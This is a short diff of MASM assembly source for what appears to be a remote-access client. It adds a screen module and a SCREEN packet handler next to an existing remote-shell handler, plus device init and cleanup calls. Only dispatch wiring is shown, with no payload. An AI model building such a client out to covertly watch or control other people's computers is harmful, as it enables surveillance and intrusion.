@@ -8,6 +8,7 @@ include network.inc
 include mem_alloc.inc
 include packet.inc
 include shell.inc
+include screen.inc
 
 include /masm32/include/kernel32.inc
 include /masm32/include/user32.inc
@@ -220,6 +221,8 @@ PacketDispatch      proc    header:ptr Header, data:ptr BYTE
             mov     eax, FALSE
         case    SHELL
             invoke  OnShell, server, header, data
+        case    SCREEN
+            invoke  OnScreen, server, header, data
         default
             mov     eax, TRUE
     endsw
@@ -249,6 +252,7 @@ Connect             endp
 
 
 LoadModules         proc
+    invoke  InitDevice
     invoke  StartupShell, server
     ret
 LoadModules         endp
@@ -256,6 +260,7 @@ LoadModules         endp
 
 FreeModules         proc
     invoke  StopShell
+    invoke  FreeDevice
     ret
 FreeModules         endp
 
